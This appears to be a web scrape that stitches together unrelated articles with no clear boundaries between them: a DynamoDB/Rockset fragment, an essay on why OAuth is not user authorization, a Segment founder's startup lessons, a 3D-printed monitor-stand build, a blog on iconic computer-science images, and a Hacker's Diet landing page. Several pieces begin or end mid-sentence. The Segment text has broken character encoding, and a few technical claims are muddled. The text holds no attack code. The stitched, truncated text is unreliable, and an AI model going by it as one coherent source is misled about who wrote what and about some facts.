<p>In this case, the problem is that DynamoDB’s global secondary indexes require additional read and write capacity provisioned, leading to additional cost. This means that either your queries will run slower or you will incur greater costs.</p>
<p>These challenges can sometimes be a hindrance to some companies deciding whether or not they want to take on the risk of developing on DynamoDB.</p>

<p>This is where analytics engines like <a href="https://rockset.com/sql-on-dynamodb/" target="_blank" rel="noopener noreferrer" data-href="https://rockset.com/sql-on-dynamodb/">Rockset</a> come in. They not only provide a SQL layer that makes it easy to access the operational data but also provide the ability to ingest the data into their data layer — which supports joins with data from other AWS data sources, like Redshift and S3.</p>
<p>We’ve found tools like this to be helpful because they can reduce the need for developers and data engineers who can interface with DynamoDB. Instead, you can do your analytical work and answer the important questions without being held back.</p>
<p>For those who have ever worked on an analytical team, it can be very difficult to explain to upper management why data exists, but you’re still unable to provide insights. Using layers like Rockset can take the complexity away.</p>

December 2, 2020 | https://www.scottbrady91.com/OAuth/OAuth-is-Not-User-Authorization | <a href="https://web.archive.org/web/*/https://www.scottbrady91.com/OAuth/OAuth-is-Not-User-Authorization">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div itemprop="articleBody">
<p>
In the same way that <a href="https://www.scottbrady91.com/OAuth/OAuth-is-Not-Authentication" title="OAuth is Not Authentication" target="_blank">OAuth is not authentication</a>, it <strong>also does not tell us what the user is allowed to do or represent that the user can access a protected resource</strong> (an API).
</p>
<p>
Understanding what OAuth is not is just as important as knowing what it is, in order to use it effectively.
In this article, I’m going to discuss how OAuth does not include user authorization and why user authorization rules should not live within your OAuth authorization server.
</p>
<p>
<span>TL;DR:</span> OAuth is not suitable for user authorization.
The fact that you have an access token that allows you to act on the user’s behalf does not mean that the user can perform an action.
</p>
<h2>Client Authorization (Delegation)</h2>
<p>
OAuth is an authorization protocol, but maybe a better name for it is a delegation protocol.
It is a protocol that allows a client application to request permission to access a protected resource (API) on the resource owner’s (the user’s) behalf.
</p>
<p>
Let’s take a look at the authorization process:
</p>
<ol>
<li>The client application asks the user if they can access a protected resource on their behalf (by redirecting the user to the authorization server’s authorization endpoint, specifying exactly what they would like to access (scopes))</li>
<li>The user identifies themselves to the authorization server (but remember, OAuth is not authentication; you’ll need OpenID Connect to help you with that)</li>
<li>The user authorizes the client application to access the protected resource on their behalf (using the OAuth consent process)</li>
<li>The client application is issued an access token</li>
</ol>
<p>
<strong>An access token represents that the client application has been authorized by the user</strong>.
The protected resource can look at the access token and say, “okay, Alice authorized this application to access these parts of my system on their behalf; I’ll let it through”.
However, <strong>just because Alice said it was okay does not mean that Alice is authorized to access the protected resource</strong>.
</p>
<h3>Client Authorization vs. User Authorization</h3>
<p>
Let’s break that down, using a banking system as an example:
</p>
<ul>
<li><strong>Client authorization:</strong> can this client application read Alice’s transaction history?</li>
<li><strong>User authorization:</strong> can Alice view the balance of account #123?</li>
</ul>
<p>
OAuth can handle client authorization by issuing an access token that Alice authorized.
OAuth cannot handle user authorization.
</p>
<p>
Open Banking &amp; FAPI introduce <a href="https://tools.ietf.org/html/draft-ietf-oauth-rar" target="_blank" rel="noopener">Rich Authorization Requests</a> (RAR), where a client application can ask the user to authorize a specific transaction.
But again, this is about the user consenting to the transaction, as opposed to what the user is allowed to do.
</p>
<h2>User Authorization Rules in your OAuth Authorization Server</h2>
<p>
Hopefully, it’s now clear that an OAuth access token (or an OpenID Connect identity token for that matter) does not represent the user’s permission to do something.
But what about putting user-level authorization rules within your authorization server?
After all, you already kind of have that with the user authentication process.
</p>
<h3>User-level authorization during authentication</h3>
<p>
This is where I am happy to give some ground.
Confirming that the user is authorized to use your system when they authenticate is perfectly acceptable.
For example, has the user been disabled by an administrator?
Do they still qualify to use your services?
</p>
<p>
If you decide that the authenticating user is not authorized to use your system, you simply do not let them log in.
These kinds of checks can also be performed during token generation or maybe as part of token validation (think of the introspection endpoint).
</p>
<h3>User-level authorization based on request</h3>
<p>
What breaks this is when you try and add user-level authorization per client application or protected resource.
For instance, is the user permitted to use this scope?
Are they permitted to use this client application (while OAuth is not authentication, you may see this check when using OpenID Connect)?
</p>
<p>
This would make your OAuth authorization process look like this:
</p>
<ol>
<li>The client application asks the user if they can access a protected resource on their behalf </li>
<li>The user identifies themselves to the authorization server </li>
<li>The authorization server decides if the user is authorized to access the client or protected resource</li>
<li>The user authorizes the client application to access the protected resource on their behalf</li>
<li>The client application is issued an access token</li>
</ol>
<p>
Adding another Access-Control List (ACL) to your authorization server can’t be that bad, right?
After all, it is an <em>authorization</em> server!
</p>
<p>
In my opinion, this is <strong>brittle and prone to error</strong>.
You are now back to relying on the fact that tokens were issued to represent that the user and the request have been authorized, which is not something OAuth was designed for and is a dangerous assumption to make.
</p>
<p>
Just as many attempts to use OAuth to represent user authentication have failed, I’ve seen the same happen with user authorization too many times.
The protocols just weren’t designed for it, and it’s just too easy to get wrong, especially when your token issuer is also providing SSO, issuing tokens without user interaction.
</p>
<p>
You are likely using a framework or out-of-the-box solution as your OAuth authorization server, which will want to follow the OAuth specification and issue a token to the authorized client application.
<strong>You’ll spend your time fighting the design of OAuth</strong>, and if you make a single mistake or misunderstand how your framework of choice works, then the authorization server will kick in and issue the token as the user and client have requested, just like it is meant to.
</p>
<p>
I know I’m blurring the lines between OAuth and OpenID Connect a little here, but here’s a Stack Overflow question that I think highlights the kind of bizarre scenario you could find yourself in:
</p>
<blockquote>
“I am looking [for] a way for [my authorization server] to invalidate the submitted token if the user doesn’t have access to the application in a single go, even though the challenged token might be valid if it is submitted by other application which the user has access to”
</blockquote>
<p>
While you initially wanted to have all of your user authorization rules live within your central OAuth authorization server, you will likely end up duplicating these checks into your client applications and APIs to solve these kinds of problems.
You are probably going to code yourself into a corner.
</p>
<h2>User Permissions in your OAuth Authorization Server</h2>
<p>
This is where most of my customers end up after understanding that user-level authorization is not part of the OAuth protocol and that it is not an easy fit within their OAuth authorization server.
But the desire to write all of their authorization logic and user permissions in a single place still exists, which is understandable, especially when they have already achieved that with authentication and API access by using an SSO solution that implements both OAuth and OpenID Connect.
</p>
<p>
So, what is the solution? Role-Based Access Control (RBAC)?
Stuff tokens full of user permissions?
</p>
<p>
Well, that is a story for another day and well outside of this OAuth story.
I recommend checking out Dom’s excellent article on how <a href="https://leastprivilege.com/2016/12/16/identity-vs-permissions/" target="_blank" rel="noopener">identity and permissions don’t mix within an SSO solution</a>.
For solutions, take a look at how <a href="https://www.identityserver.com/documentation/enforcer/alfa/IntroducingAlfa/" target="_blank" rel="noopener">authorization languages are evolving</a> with ALFA and how you can create authorization policies in a single place that are readable by non-developers.
</p>
<h2>The Random Stuff</h2>
<p>
This article would not be complete without collating some of the weird and wonderful loaded questions I have received on Stack Overflow or my blog.
These are often followed by a “gotcha” or a “checkmate”, or sometimes even a personal insult.
But I’ll let your imagination come up with those.
</p>
<h3>“Then why is it called an authorization code?”</h3>
<p>
The authorization code represents the user authorizing the client application on their behalf. Again, that is client authorization, not permission to add user authorization.
</p>
<h3>“Then why do people return 401 Unauthorized when you don’t have a token?”</h3>
<p>
Naming is hard.
In this use case, it would be nice to have named this status code “Unauthenticated”, but at least <a href="https://tools.ietf.org/html/rfc7235#section-3.1" target="_blank" rel="noopener">RFC 7235</a> requires that you include a <code>WWW-Authenticate</code> header alongside this status code.
</p>
<h3>“Then why is it called the Authorization header?”</h3>
<p>
Again, naming is hard. Basic Authentication also uses the Authorization header, but that doesn’t mean the user has full access or is even allowed to use the application.
You still have to check if the user is allowed to perform an action.
</p>
<h3>“Then what are scopes for?”</h3>
<p>
Scopes represent a level of access that a client application is asking for from the user.
For instance, a scope called “email.read” might mean “can I read your emails?”, or “email.send” might mean “can I send emails on your behalf?”.
Check out Auth0’s article on <a href="https://auth0.com/blog/on-the-nature-of-oauth2-scopes/" target="_blank" rel="noopener">the nature of OAuth scopes</a>.
</p>
<p>
This is a fairly common mistake to make when starting out with OAuth, so I’ll forgive you for this one.
</p>
<h3>“I still don’t believe you! Everyone does this!”</h3>
<p>
Well, that’s just, like, your opinion, man.
But it isn’t OAuth.

<p>In Segmentâ€™s early days, we hit countless problems as a founding team. And at the time, I thought those problems were unique to our own special snowflake of a founding journey. I chalked it up to us being new grads and first-time founders.</p><p>But as I've worked with more and more startups, I've realized just how wrong I was.</p><p>Over the past five years, I've made about 25 different seed-stage investments. In doing so, it's taught me a <em>LOT</em> about the common errors that startup founders make. Even across different industries and levels of experience, I see founders hitting the exact same set of problems we encountered in the early days of Segment!</p><p>This post shares a handful of the top lessons that benefit todayâ€™s early stage founders. Itâ€™s a list of the things I wish weâ€™d figured out earlier at Segment. [1]</p><p>This sounds incredibly boring... but the #1 mistake I see startups making is that they donâ€™t set goals. If you take one thing from this post, it's that you should set goals for where you want to be.</p><p>For the longest time at Segment, we didn't have goals. We moved ahead in various (often random) directions, and we would launch features consistently... but we never really set goals at all.</p><p>As we grew the company, we started to lose momentum. Teams were spending time on a bunch of stuff that frankly just didn't really matter to the overall business.</p><p>It wasn't until we hired our VP Eng, Tido, that we finally started setting focused and audacious product goals. Just by verbalizing where we wanted to go and then grading our results, our velocity improved by an order of magnitude.</p><p>I don't care if you call them OKRs, sprints, or something else entirely. Just set a deadline when you want to have something done and a metric you want to move or some other concrete result.</p><p>When early stage founders do attempt to set goals, I often see them agonize over what specific goals to choose. In practice, a "pretty good goal" is way better than "no goals at all". Perfect is the enemy of good.</p><p>If you don't yet have product-market fit, your goal should probably be getting your first 3-5 customers using the product. If you've hit the level where you now have dozens of users, your goal should be growing by an order of magnitude. It's better to get in the habit of setting and driving towards goals rather than being too worried about their exact semantics. Worst case, you just pick a better goal later.</p><p>A great set of goals answers the question: <em><strong>"what would have to be true in order for us to feel good about our progress at the end of the month?"</strong></em><em> [2]</em></p><p>If each teammate can independently answer "what are our goals for the month?" in the same way, you'll know you've succeeded. If youâ€™re looking for prior art, read <a href="https://www.amazon.com/Measure-What-Matters-Google-Foundation/dp/0525536221">Measure What Matters</a>. </p><p>If you strictly focus on making things true by a certain date, you are bound to make at least some progress towards your end result. </p><p>At the end of the day, every billion-dollar startup is really just the sum of many small deltas.</p><p>Let's get one thing straight: your investors won't know everything. But investors won't know <em>anything</em> if you don't keep them updated on how things are going.</p><p>For the longest time, we were fearful of our Segment investors, to the point that we wouldn't bother sending them emails unless they asked about us. I can say now with confidence that this was 100% the wrong approach.</p><p>We worried that investors would think that we were screwing up (true) and failing (true as well!). And while that might be the case, a founder-friendly investor won't think that way. Investors, especially angels, invested because they believe in <em>you</em>. If I didn't think a team would go somewhere, I wouldn't put money in.</p><p>With each investor, <strong>include the goals you're working towards, as well as the asks for them</strong>. I think monthly is about the right cadence for this in the early days, moving to quarterly around Series A/B time when you start partnering more with a few board members.</p><p>Simply writing the updates should clarify your own thinking tremendously. If it takes you more than 1-2h to put together an update on the most important things happening at the company, it's probably a sign that you should be doing more thinking about the big picture.</p><p>When asking for help, the things that our investors have been able to help us with evolved quite a bit over time. But here's a good rule of thumb for what to ask for:</p><ul><li><p><u>Seed/Pre-seed</u>: user-testing, intros to beta users, hiring</p></li><li><p><u>Series A</u>: hiring, early customers, go-to-market</p></li><li><p><u>Series B/C+</u>: comparables at other companies, senior/exec hires, specific expertise around things like management, infrastructure, systems, etc.</p></li></ul><p>Not all investors will be able to help with everything. But at the very least, sending them information will help you be top of mind. I've lost track of how many times a moment of serendipity where I'm catching up with an old friend has led to a meaningful conversation for a company I've invested in.</p><p>As an extra bonus, the strongest startups send these updates to everyone on their team. It's amazing how much putting the goals in writing helps everyone stay on the same page about what's most important.</p><p>One other note here: take pictures. I now wish we had far more pictures of Segment at every stage of the company. They help turn investor updates into cherished memories.</p><p>Okay, this lesson is taken directly from the YC playbook. And YET, I see so many founders (including YC founders) fail to launch their product. </p><p>If no one notices your launch... just ignore it and then launch again. If you're doing things right, you'll never run out of stuff to launch! [3]</p><p>Why is launching so important? Let me share a personal story...</p><p>We spent about 1.5 years building different iterations of analytics tools. For every iteration, we had a waitlist that users could sign up to use. We personally reached out to the users who we thought were the best fits, and then tried to set up time to use the product. </p><p>The result? Nobody cared. We had no users. We never launched. </p><p>When we finally launched Segment in it's current incarnation, we threw out that approach entirely. We put up a self-service flow, and let anyone who wanted to sign up for it.</p><p>That's when something strange happened... we attracted an entirely new set of developers who just were crawling out of the woodwork and excited to use the new product we'd built. They were coming from companies far outside of SV that we'd never heard of.</p><p>It floored me.</p><p><strong>Lesson learned: the people you happen to be talking to now are probably not the people who have the biggest problem in your space. Do everything you can to reach the folks with the biggest problem, and then, reduce any barriers they might encounter.</strong></p><p>I expect a bunch of you reading this post to ignore this advice, just like we did in the early days. It takes a certain confidence to launch something you've built and put it out there for the world to see. Ultimately though, the rewards are worth it. You'll see users coming from communities you've never even heard of.</p><p>Let me tell you a tale of two startups.</p><p><strong>Startup A</strong> is constantly putting up interesting content on their blog. Their founders are sharing product launches, engineering posts, and creatively brainstorming about what it takes to solve problems in their market.</p><p><strong>Startup B</strong> is operating in stealth. You can't find much about them online, but one of the founders reached out with a nice personalized email mentioning their funding by a top-tier VC. </p><p>Suppose you're looking for a job... do you pick Startup A or Startup B? In my experience, A almost always wins. Momentum is a compounding force.</p><p><strong>Unless you are working in a space that heavily depends on IP, you should probably be publishing more content about what you are doing.</strong> This could be open source, it could be a weekly newsletter, it could be a changelog. [4]</p><p>Whatever it is, it's going to help you both hire <em>and</em> attract customers. So much of the internet is merely about consuming, that just by putting ideas out there, youâ€™ll have a leg up on the competition.</p><p>In the early days of Segment, our <a href="https://segment.com/blog/show-hn-to-series-d/">user acquisition was powered by open source projects and blog posts</a>. But I've seen founders have success with Twitter, Substacks, Podcasts and a variety of different channels.</p><p>If you're looking for inspiration, the <a href="https://railway.app/changelog">Railway</a> and <a href="https://linear.app/changelog">Linear</a> changelogs are epic examples. Companies like <a href="https://baremetrics.com/blog/i-sold-baremetrics">Baremetrics</a> and <a href="https://buffer.com/resources/shareholder-update-q2-2020-and-july/">Buffer</a> differentiated themselves by just being open and honest. <a href="https://stripe.com/blog/globe">Stripe</a> and <a href="https://www.figma.com/blog/behind-the-feature-the-making-of-the-new-auto-layout/">Figma's blogs</a> not only share what they build, but how they built it.</p><p>There are three big inputs that all startups need to continue growing</p><ol><li><p>product capabilities</p></li><li><p>customers and users</p></li><li><p>hiring</p></li></ol><p>I've put them in roughly the order that most teams encounter them. </p><p>Startups begin with a small product that has a modicum of utility. It starts attracting a handful of customers organically. And as more and more customers start using the product, the founders realize that they need extra help to stay on top of all of those requests.</p><p>Remember though, the real goal here is #2. Itâ€™s not the size of your team, itâ€™s the value youâ€™re able to provide to the world. [5]</p><p>I see hiring a big team before you have product-market fit as a red flag. If the company doesn't yet have a set direction, it's going to be harder to pivot with 10 people than it is with 3.</p><p>But, I've worked with startups who have traction and runway... and just seem to be spinning their wheels under load from existing customers.</p><p>I get it. Hiring isn't the most fun, especially for an introvert. It's a lot of interviewing and feeling like there's a lot of rejection. Rejecting people sucks. Losing candidates sucks. For many of our roles at Segment, we've had to talk with 50-100 different people to make an eventual hire.</p><p><strong>If you have 24 months of runway, and a clear list of things youâ€™d do if you had more copies of yourself: you probably aren't spending time to hire the people you need.</strong></p><p>At Segment, my co-founder <a href="https://twitter.com/ivolo">Ilya</a> fulfilled this role. It was back in 2014, we were 12 people at the time, had raised a $10m Series A, and had $1m in revenue.</p><p>Thing…</p></div></div>

<p>
While this is one of the simplest things I’ve made it’s also one of my favourites. All you need is a shelf or any other board cut to the correct size and access to a 3D printer. There are online services you can order 3D printed objects from if you don’t have access to a printer yourself. The advantage to using the Ikea shelf as I did is that it comes the perfect size and is already finished. Living in the city with easier access to Ikea than a workshop this is very convenient. If you do have a shop you could make the top out of anything you like.
</p>
<p><img src="https://www.iansmith.is/images/monitor-stand/monitor-stand-3d-model.png" alt="Monitor Stand 3D Model" title="Monitor Stand 3D Model"></p>
<p>Here’s the self I ordered from ikea: <a href="https://www.ikea.com/ca/en/p/svalnaes-shelf-bamboo-00322859/">Ikea SVALNÄS Shelf</a>. While waiting for it to ship I modeled some feet in Fusion360. My main requirements were that the stand has to hold my 27 inch monitor and it has to fit my midi keyboard underneath. I’ve uploaded the models for the feet on <a href="https://www.thingiverse.com/thing:4673014">Thingiverse</a>.</p>
<p><img src="https://www.iansmith.is/images/monitor-stand/monitor-stand-feet.jpeg" alt="Monitor Stand Feet" title="Monitor Stand Feet"></p>
<p>Once you have the feet printed and have the top all you’ll need is a drill and some screws. Set each foot in place and mark the holes. Then carefully pre-drill about halfway through the shelf. The Ikea shelf is particularly soft, it may even be somewhat hollow. You’ll want to make sure you don’t accidentally drill all the way through. I wrapped some painters tape around the drill bit to mark the depth. Once you have the holes drilled crew the feet into place and tighten by hand. The screws are only there to hold the feet in place and don’t actually take any weight so no need to over tighten them.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="js-article">
    
<p>Over the years I've noticed some images (not diagrams or graphs) that are recognizable to programmers. These images also often have backstories that contain educational information, so here they are! </p>
<h3 id="lena">Lena<a href="#lena" aria-label="Anchor link for: lena"> <i></i></a>
</h3>
<p><img src="https://carolchen.me/blog/img/cs_images/lena.png" alt=""></p>
<p>Lena is a Swedish model and this photo of her is from a Playboy cover. Her name is sometimes spelled "Lenna" to encourage her name to be pronounced as "leh-nah" instead of "lee-nah", which is a mildly amusing parallel to classification tasks. The full image has her mostly nude. </p>
<p>The photo was first used six months after release in 1972 because of the mixture of textures and colours for testing an image compression algorithm. This eventually led to JPEGs (first released 1992). It's was standard to use the image to showcase differences between image compression algorithms .</p>
<p>For obvious reasons, having a nude model be the face of all image processing has raised concerns. Still there are blog posts, papers and websites that still use Lena for image processing, though recently it's been about computer vision, style transfer, etc. </p>
<h3 id="the-cornell-box">The Cornell Box<a href="#the-cornell-box" aria-label="Anchor link for: the-cornell-box"> <i></i></a>
</h3>
<p><img src="https://carolchen.me/blog/img/cs_images/cornellbox.png" alt=""></p>
<p>Anyone who has taken a graphics course has seen this box as it was first presented at a SIGGRAPH in 1984. It consists of five planes, an overhead light, a rectangular prism and cube. Variations are often seen with spheres of different materials such as dielectrics (glass),  and metals instead of lambertians (the matte texture). </p>
<p>For a raytracer (or pathtracer) this tests a lot of important features. The shadowing of the rectangle onto the wall, contrasting wall colours that should emit some colour onto the white (this is called diffuse reflection). </p>
<p>As shown below, it can also showcase (or rather, suffer from) tone mapping, which is a technique used to map a set of colours to another to make the range look "dynamic" or at least correct. The image below has a bug where the lack of tonemapping causes the image to bug out where it tries to make the colour brighter than a pure white pixel. </p>
<p>Another issue with the image below is the noise, which can be fixed by more sampling in this specific case as it's a monte carlo ray tracer, so it uses some brute force and randomization as computers can't actually simulate light going in infinite directions. </p>
<p><img src="https://carolchen.me/blog/img/cs_images/badtracer.png" alt=""></p>
<p>Other classic rendering images include the Stanford bunny and the Utah teapot. It's been a meme to hide the Utah teapot into random scenes, and the teapot is the graphics version of "Hello World". It appears in Toy Story, the Simpsons, a Windows screensaver, and the Sims. Here's a <a href="https://www.youtube.com/watch?v=TIxt9guMbXo">2.5 minute video about the teapot from Tom Scott</a>. </p>

<p><img src="https://carolchen.me/blog/img/cs_images/bigred.jpeg" alt=""></p>
<p>CLRS! The iconic graphic on the textbook is obviously representative of a tree, but it's actually based on a piece of art. It was made by Alexander Calder in 1959. If you don't already know about mobiles, they're really cool, carefully engineered to work with equilibrium and air currents. Big Red, made from sheet metal and steel weird, can be found at the Whitney Museum of American Art! </p>
<p>Fun fact, Cormen (the C in CLRS) and co wanted to recolour the depiction to use red and black, but the Calder estate would not allow it. You can also purchase <a href="https://www.hangingmobilegallery.com/big-red-mobile/">similar versions of the mobile</a>.</p>
<h3 id="the-dragon-book-cover">The Dragon Book Cover<a href="#the-dragon-book-cover" aria-label="Anchor link for: the-dragon-book-cover"> <i></i></a>
</h3>
<p><img src="https://carolchen.me/blog/img/cs_images/dragon.jpg" alt=""></p>
<p>This popular compilers textbook is often referred to as the "Dragon Book" because of the 🐉.The Dragon's shirt says "Complexity of Compiler Design", the shield says "Syntax Directed Translation" and the sword says "LALR Parser Generator". The older edition also has the knight riding a horse labeled "Data Flow Analysis". </p>
<p><img src="https://carolchen.me/blog/img/cs_images/greendragon.jpg" alt=""></p>
<h4 id="syntax-directed-translation">Syntax Directed Translation<a href="#syntax-directed-translation" aria-label="Anchor link for: syntax-directed-translation"> <i></i></a>
</h4>
<p>The shield describes a method where the compilation is guided by the parser, and describes a more simpler subset of compilers. Syntax directed translation is a method of implementation used on context-free grammars (there's a whole linguistics thing behind this, but it's mostly what it sounds like) as a Type 3 language (on the <a href="https://en.wikipedia.org/wiki/Chomsky_hierarchy#Type-2_grammars">Chomsky Heirarchy</a>) could not be driven by the parser. There aren't too many commonly used languages that would be described as completely context free though there are languages that only have small caveats to become CFGs (not to be confused with control flow graphs, another compilers concept). If you want to read more, this <a href="https://stackoverflow.com/questions/14589346/is-c-context-free-or-context-sensitive">Stack Overflow question</a> is a good start. </p>
<p>Anywho, this is likely the shield because it prevents any blurring of "execution" and "compilation" by not having any ambiguities embedded in the grammar. </p>
<h4 id="lalr-parser-generator">LALR Parser generator<a href="#lalr-parser-generator" aria-label="Anchor link for: lalr-parser-generator"> <i></i></a>
</h4>
<p>LALR is a type of parser (look ahead left to right) that is simpler than an LR parser (left to right, rightmost derivation) but more powerful than LL parsers (left to right, leftmost derivation). Parser generators greatly improve the pains of writing a parser. GCC started off with a parser generated (it's handwritten as of 2004), CPython makes their own LL* parser generator (*it's a bit variant, CPython devs may correct me), Haskell+OCaml+Ruby are on LALR generators. </p>
<p>Writing a nice parser that works, is fast <em>and</em> surfaces nice syntax errors is a difficult design task, and a bit tedious after designed! Hence the dragon will be slayed by a LALR parser generator (YACC is taught in the book). </p>
<h4 id="data-flow-analysis">Data Flow Analysis<a href="#data-flow-analysis" aria-label="Anchor link for: data-flow-analysis"> <i></i></a>
</h4>
<p>Data flow analysis is what it sounds like, tracking the movement of variables or other stored memory through a program. It is represented as the horse the knight is riding probably because it powers most things. I tried to think of why it might be removed from the cover, but there's no obvious answer and everything I came up with just sounded like a conspiracy theory. </p>
<h3 id="o-reilly-animals">O'Reilly Animals<a href="#o-reilly-animals" aria-label="Anchor link for: o-reilly-animals"> <i></i></a>
</h3>
<p><img src="https://carolchen.me/blog/img/cs_images/animals.jpg" alt=""></p>
<p>Iconic meme-able book covers! But who draws them? Who picks the animals when the book is not just called Python? Why are they pictures of animals?</p>
<p>O'Reilly claims that this originated in the weirdness of Unix terms like awk, sed and yacc, and really the rest of it was "it just clicked". Many of them were drawn by one Lorrie LeJeune, and were done with pen and paper! There are also amusing stories of complaints from the arachnephobic who had to deal with spiders on covers. You can find a list of all the books and animals <a href="https://www.oreilly.com/animals.csp">here</a>.</p>
<p>Edie Freedman, the creative director who saw over this claimed that there's meaning to how all the animals that were selected though they aren't revealed. But here are some of the answers. </p>
<h4 id="the-obvious-ones">The Obvious Ones<a href="#the-obvious-ones" aria-label="Anchor link for: the-obvious-ones"> <i></i></a>
</h4>
<p>Many (but not all) of the Python books have snakes, Rust has a crab, OCaml has a Camel, GNU has a gnu. </p>
<h4 id="oracle-bugs">Oracle Bugs<a href="#oracle-bugs" aria-label="Anchor link for: oracle-bugs"> <i></i></a>
</h4>
<p>"Oracle Essentials" has a cicada, "Oracle Regular Expressions" have spiders, "Oracle 8i Internal Services" has a bumblebee, dragonfly, dung beetle, lady bug, lantern fly, leaf insect, ants, praying mantis, etc. <em>Very</em> consistently bugs. The speculation is often "oracle software bad" but its likely just a meaningless theme (with each animal having a deep meaning) and not meant to piss off Oracle. It is special as even Python is not consistently snakes, and other groups of books like Google, Regular Expressions, Javascript, etc, do not have any themes. </p>
<h4 id="perl-camel">Perl Camel<a href="#perl-camel" aria-label="Anchor link for: perl-camel"> <i></i></a>
</h4>
<p>Here's a weird one, as the obvious choice would be an oyster for the pearl. <a href="https://www.wsj.com/articles/SB870061922836237000">Wall Street Journal claims</a> that Larry Wall, creator of the language, wanted a camel because like Perl it's ugly but can go a long way without water. Some also claim it's a reference to the proverb "a camel is a horse designed by a committee" and how Perl is easily identifiable as a mixture of other languages. It's cool as the camel as adopted as Perl's mascot after the O'Reilly book. </p>
<h4 id="python-entirely-my-conspiracy">Python (entirely my conspiracy)<a href="#python-entirely-my-conspiracy" aria-label="Anchor link for: python-entirely-my-conspiracy"> <i></i></a>
</h4>
<p>Not all of the Python books have snakes! "Data Wrangling with Python" has a lizard, which seems to be a reference to giving Python "legs" to work with data. "Python Programming On Win32" is a crocdile, which to me just screams "PYTHON BUT MAKE IT SCARY". "Learning Python" is a rat and "Python Coobook" is a rabbit, which may be a reference to them being more introductory Python books as they're snake food. </p>
<h3 id="macos-powder-explosion-wallpaper">MacOS Powder Explosion Wallpaper<a href="#macos-powder-explosion-wallpaper" aria-label="Anchor link for: macos-powder-explosion-wallpaper"> <i></i></a>
</h3>
<p>MacOS has always had some iconic wallpapers, especially of California views so this one stood out to me as "this should be generated". This isn't related to programming but I thought I'd investigate it since I've always wanted to know. </p>
<p><img src="https://carolchen.me/blog/img/cs_images/explosion.png" alt=""></p>
<p>Apple explicitly scrubs EXIF data, which is all that microchip tracking metadata that are automatically attached to your images for location, time, device, shutter speeds, etc. The one time the EXIF was leaked on one image it had a bunch of nitpicking notes like "fill in this area close to the edge with more tree so it doesn’t create awkward negative shapes" and "darken some of the stars that are a bit smaller and darker, so there is a little more difference in the starfield" which I guess could be expected for the quality of the Apple wallpapers and the anxiety that comes with being the photographer for a MacOS wallpaper. </p>
<p>Spoiler alert, I didn't actually figure out if these were generated or photographed, but I did figure out <em>how</em> one would generate/photograph them, and that they are <em>very</em> probably photographed. Here is the precedence: photographed ethereal Apple productions. </p>

<h4 id="how-to-photograph">How to Photograph<a href="#how-to-photograph" aria-label="Anchor link for: how-to-photograph"> <i></i></a>
</h4>
<p>As expected, making these powder explosions would be a pain. One must first have the space, the high speed camera (powder flying through the air like that lasts less than a second) and cover all of the equipment. The powder is typically flour, and mixed with "holi" powder which is just high pigment powder for photoshoots/parties/crafts. It seems that many photographers actually have people in suits to throw the powder and those shots tend to look more like powder clouds than explosions. I found someone who did something a bit more clever, which involves a simple canon mechanism (silicon tubing and a pump) and sound triggered. </p>
<h4 id="how-to-render">How to Render<a href="#how-to-render" aria-label="Anchor link for: how-to-render"> <i></i></a>

<p>3D animation software of course would also enable you to do this, and in my opinion produces better results. </p>
<p>The general approach is to start with a sphere, create some noise outwards like a spiky ball. Turn those vectors into dots going out, then configure those …</p></section></div>

<h3><i>How to lose weight and hair through stress and poor nutrition</i></h3>
<address>
By
<a href="https://www.fourmilab.ch/" target="_top">John Walker</a>
</address>
</center>

<p>

<cite>The Hacker's Diet</cite>, notwithstanding its silly
subtitle, is a serious book about how to lose weight and
permanently maintain whatever weight you desire.  It
treats dieting and weight control from an <em>engineering</em>
and <em>management</em> standpoint, and provides the tools
and an understanding of why they work and how to use
them that permit the reader to gain control of their
own weight.  The book is intended primarily for busy,
successful engineers, programmers, and managers who
have struggled unsuccessfully in the past to lose
weight and avoid re-gaining it.
<a href="#Comptools">Computer-based tools</a>
and experiments in Microsoft Excel or the Palm Computing
Platform are available, as well as an online Web application,
but a computer is not necessary to use
the techniques described in the book; paper and pencil
alternatives are provided.

<h2><a href="https://www.fourmilab.ch/hackdiet/e4/">Fourth Edition (2005)</a></h2>

<p>
<a href="https://www.fourmilab.ch/hackdiet/e4/"><img src="https://www.fourmilab.ch/hackdiet/figures/hdpage4.png" width="256" height="288" alt=""></a>
The Fourth Edition of <cite>The Hacker's Diet</cite> was
released in November 2005.  It is essentially identical in content with the
previous editions, but has been extensively re-formatted to improve
appearance, accessibility, ease of navigation, and standards compliance.
The Fourth Edition strictly complies with the
<a href="http://www.w3.org/TR/xhtml1/" target="Hackdiet_Aux">XHTML&nbsp;1.0</a> (Transitional and Frameset)
and
<a href="http://www.w3.org/TR/CSS21/" target="Hackdiet_Aux">CSS&nbsp;2.1</a>
standards and requires a browser which implements these
standards.  (As of the release of this edition, current versions
of all of the most popular browsers, including Mozilla Firefox,
Opera, and Microsoft Internet Explorer supported these standards
sufficiently to display the book without problems.)  In addition, the
browser and operating system must display Unicode character entities.
JavaScript and DOM/DHTML are used in the navigation bar, but if they're
absent or disabled, everything will still work.  If your browser and/or
system cannot handle this version, the Third Edition (Frames) or the
No-Frame editions, both of which date from 1994, will almost certainly
work.  The content is the same; only the presentation is more rudimentary.
<br clear="right">
</p>

<h2><a name="epub" href="https://www.fourmilab.ch/hackdiet/epub/hackdiet.epub">EPUB Edition (2011)</a></h2>

<p>
<a href="https://www.fourmilab.ch/hackdiet/epub/hackdiet.epub"><img src="https://www.fourmilab.ch/hackdiet/figures/hd_ipad_256.png" width="198" height="288" alt=""></a>
The
<a href="http://en.wikipedia.org/wiki/EPUB" target="Hackdiet_Aux">EPUB</a>
edition is in the open document format
compatible with the iBooks application on the Apple iPad, iPhone, and
iPod&nbsp;touch; Sony Reader; Barnes and Noble Nook; and a variety of
other electronic book devices and mobile platforms.  EPUB books may be
opened directly with a Web browser using the
<a href="http://www.epubread.com/en/" target="Hackdiet_Aux">EPUBReader</a>
add-on for Firefox or the
<a href="http://widgets.opera.com/widget/15552/" target="Hackdiet_Aux">eBook
Reader</a>
widget for Opera, although users of desktop and notebook computers
with Internet connectivity will probably prefer the
<a href="https://www.fourmilab.ch/hackdiet/e4/">Web edition</a>,
due to its more flexible navigation options.
</p>

<p>
If your Web browser has an EPUB-compatible plug-in installed, you can
open the book simply by clicking on the
<a href="https://www.fourmilab.ch/hackdiet/epub/hackdiet.epub" target="Hackdiet_Aux"><cite>The
Hacker's Diet</cite> EPUB Edition</a>
link.  Otherwise, use your browser's idiom to download the
abovementioned file to your computer and then transfer it to your
